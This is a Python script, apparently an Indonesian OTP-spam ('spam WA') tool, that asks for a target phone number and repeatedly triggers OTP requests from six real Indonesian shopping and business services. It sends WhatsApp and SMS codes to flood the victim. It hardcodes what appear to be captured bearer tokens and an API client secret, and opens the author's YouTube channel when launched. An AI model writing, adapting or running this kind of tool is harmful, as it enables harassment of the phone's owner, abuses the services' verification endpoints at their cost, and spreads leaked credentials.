import os,sys,time,os,json,requests,json
from colorama import Fore,Back,init
from requests import get,post
from urllib import request

def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text
visitor=request.urlopen('https://api.countapi.xyz/hit/brutal-spam-wa')
getvisit=json.loads(visitor.read())
localtime=time.asctime(time.localtime(time.time()))

hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

os.system("clear")
autoketik(f"{biru}[{kuning}Warning{biru}] {W}Jangan Lupa Subscribe Channel Fatih Arridho")
time.sleep(3)
os.system("xdg-open https://youtube.com/c/FatihArridhoo")
autoketik(f"{biru}[{kuning}Warning{biru}] {W}Thx yang udah subscribe, semoga work")
time.sleep(3)
os.system("clear")
autoketik(f"""
{hijau}╔═╗{merah}┌─┐┌─┐┌┬┐  {biru}╦ ╦┬ ┬┌─┐┌┬┐{putih}┌─┐{kuning}┌─┐┌─┐ ┌─┐
{hijau}╚═╗{merah}├─┘├─┤│││  {biru}║║║├─┤├─┤ │ {putih}└─┐{kuning}├─┤├─┘ ├─┘
{hijau}╚═╝{merah}┴  ┴ ┴┴ ┴  {biru}╚╩╝┴ ┴┴ ┴ ┴ {putih}└─┘{kuning}┴ ┴┴   ┴ {ungu}V1
{abu}-----------------------------------------
{putih}[{biru}•{putih}] {biru}Author {putih}   : Fatih Arridho
{putih}[{biru}•{putih}] {abu}GitHub {putih}   : FatihArridho
{putih}[{biru}•{putih}] {merah}You{putih}Tube {putih}  : Fatih Arridho
{putih}[{biru}•{putih}] {ungu}Instagram {putih}: @fatdho
{W}[{Y}•{W}] Ip Kamu {putih}  :{Y} {ip}
{W}[{Y}•{W}] Waktu/Jam {putih}:{Y} {localtime}
{W}[{Y}•{W}] Total Run {putih}:{Y} {getvisit['value']}
""")

nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target {W}: ")
jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
for i in range(jum):
    pos = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={"Host":"www.sayurbox.com","content-length":"289","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g","content-type":"application/json","accept":"*/*","x-bundle-revision":"6.0","x-sbox-tenant":"sayurbox","x-binary-version":"2.2.1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.sayurbox.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"})).text
    pos = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","content-length":"76","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","sec-ch-ua-platform":"Android","origin":"https://www.matahari.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"otp_request":{"mobile_number":nomor,"mobile_country_code":"+62"}})).text
    tod = requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","content-length":"306","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","x-tokko-api-client":"merchant_web","content-type":"application/json","accept":"*/*","x-tokko-api-client-version":"4.5.1","sec-ch-ua-platform":"Android","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
    kon = requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={"Host":"api-v2.bukuwarung.com","content-length":"198","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko-web","sec-ch-ua-platform":"Android","origin":"https://tokoko.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://tokoko.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
    mek = requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","x-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"A4p3vs1Ixu9wp3wFmCEG9K","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":1})).text
    rupa = requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
    print (f"{W}[{G}✓{W}] Success Sended Spam")
